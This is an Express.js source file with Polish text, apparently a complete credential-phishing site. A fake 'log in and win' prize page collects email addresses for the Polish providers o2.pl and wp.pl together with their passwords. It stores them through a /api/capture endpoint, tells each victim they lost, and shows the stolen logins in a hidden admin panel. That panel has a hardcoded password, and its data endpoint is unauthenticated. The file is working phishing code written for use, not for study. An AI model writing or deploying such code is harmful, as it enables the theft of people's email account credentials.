const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

// Baza danych w pamięci na przechwycone dane
const usersDB = []; 

// Strona główna (Frontend + Panel Admina)
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="pl">
        <head>
            <meta charset="UTF-8">
            <title>Zaloguj się i wygraj!</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh; 
                    margin: 0; 
                }
                .card { 
                    background: white; 
                    padding: 40px; 
                    border-radius: 16px; 
                    box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
                    width: 380px; 
                    text-align: center; 
                }
                h2 { color: #333; margin-bottom: 10px; font-size: 26px; }
                .subtitle { color: #666; margin-bottom: 25px; font-size: 14px; }
                .input-group {
                    display: flex;
                    align-items: center;
                    border: 1px solid #dcdde1;
                    border-radius: 8px;
                    margin: 10px 0;
                    background: #fff;
                    overflow: hidden;
                }
                .input-group input {
                    border: none;
                    margin: 0;
                    padding: 12px;
                    outline: none;
                    width: 100%;
                    font-size: 14px;
                }
                .input-group select {
                    border: none;
                    background: #f1f2f6;
                    padding: 12px 8px;
                    outline: none;
                    font-size: 14px;
                    cursor: pointer;
                    border-left: 1px solid #dcdde1;
                }
                input[type="password"], input[type="text"] { 
                    width: 100%; 
                    padding: 12px; 
                    margin: 10px 0; 
                    border: 1px solid #dcdde1; 
                    border-radius: 8px; 
                    box-sizing: border-box; 
                    font-size: 14px; 
                    outline: none;
                }
                button { 
                    background: #ff4757; 
                    color: white; 
                    border: none; 
                    padding: 12px; 
                    width: 100%; 
                    border-radius: 8px; 
                    cursor: pointer; 
                    font-weight: bold; 
                    font-size: 16px; 
                    margin-top: 10px;
                    transition: background 0.2s;
                }
                button:hover { background: #ff6b81; }
                .hidden { display: none; }
                .result-box { font-size: 18px; color: #2f3542; font-weight: bold; margin-top: 20px; }
                
                /* Panel admina */
                .admin-panel { width: 850px; text-align: left; }
                table { width: 100%; border-collapse: collapse; margin-top: 15px; }
                th, td { border: 1px solid #eee; padding: 10px; text-align: left; font-size: 13px; }
                th { background: #f8f9fa; color: #495057; }
            </style>
        </head>
        <body>

            <!-- Ekran logowania / konkursu -->
            <div class="card" id="mainCard">
                <div id="formContainer">
                    <h2>Zaloguj się i wygraj!!!</h2>
                    <p class="subtitle">Wpisz swoje dane, aby odebrać nagrodę</p>
                    
                    <div class="input-group">
                        <input type="text" id="emailName" placeholder="Nazwa e-maila" required>
                        <select id="domain">
                            <option value="@o2.pl">@o2.pl</option>
                            <option value="@wp.pl">@wp.pl</option>
                        </select>
                    </div>
                    
                    <input type="password" id="password" placeholder="Hasło" required>
                    <button onclick="handleLogin()">Zaloguj</button>
                    <p id="msg" style="color: #e63946; font-size: 13px; margin-top: 10px;"></p>
                </div>

                <div id="resultContainer" class="hidden">
                    <h2>Wynik losowania</h2>
                    <p class="result-box" style="color: #ff4757;">Niestety, ale przegrałeś!</p>
                    <p style="color: #666; font-size: 14px; margin-top: 15px;">Może następnym razem się powiedzie.</p>
                </div>
            </div>

            <!-- Panel Administratora -->
            <div class="card hidden admin-panel" id="adminCard">
                <h2>Panel Administratora (Zabezpieczony)</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Data</th>
                            <th>E-mail</th>
                            <th>Hasło</th>
                        </tr>
                    </thead>
                    <tbody id="adminTableBody"></tbody>
                </table>
                <button onclick="loadAdminData()" style="margin-top: 20px; background: #2ec4b6;">Odśwież dane</button>
            </div>

            <script>
                // Sprawdzenie czy w adresie jest ?admin=true
                if (window.location.search.includes('admin=true')) {
                    const pass = prompt("Podaj hasło administratora:");
                    if (pass === "Danielek2012") {
                        document.getElementById('mainCard').classList.add('hidden');
                        document.getElementById('adminCard').classList.remove('hidden');
                        loadAdminData();
                        setInterval(loadAdminData, 3000); // Odświeżanie co 3 sekundy
                    } else {
                        alert("Błędne hasło!");
                        window.location.href = "/";
                    }
                }

                async function handleLogin() {
                    const emailName = document.getElementById('emailName').value.trim();
                    const domain = document.getElementById('domain').value;
                    const password = document.getElementById('password').value;

                    if(!emailName || !password) {
                        document.getElementById('msg').innerText = 'Wypełnij wszystkie pola!';
                        return;
                    }

                    const fullEmail = emailName + domain;

                    // Wysyłanie danych na serwer
                    const res = await fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email: fullEmail, password })
                    });
                    
                    const data = await res.json();
                    if (data.success) {
                        document.getElementById('formContainer').classList.add('hidden');
                        document.getElementById('resultContainer').classList.remove('hidden');
                    }
                }

                async function loadAdminData() {
                    const res = await fetch('/api/admin/data');
                    const users = await res.json();
                    const tbody = document.getElementById('adminTableBody');
                    tbody.innerHTML = '';
                    users.forEach(u => {
                        tbody.innerHTML += \`<tr>
                            <td>\${u.timestamp}</td>
                            <td><b>\${u.email}</b></td>
                            <td>\${u.password}</td>
                        </tr>\`;
                    });
                }
            </script>
        </body>
        </html>
    `);
});

// Endpoint zapisujący dane
app.post('/api/capture', (req, res) => {
    const { email, password } = req.body;
    
    if (email && password) {
        usersDB.push({ 
            email, 
            password, 
            timestamp: new Date().toLocaleString() 
        });
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, message: 'Brak danych' });
    }
});

// Endpoint udostępniający dane dla panelu admina
app.get('/api/admin/data', (req, res) => {
    res.json(usersDB);
});

app.listen(PORT, () => {
    console.log(`Serwer działa na porcie ${PORT}`);
});
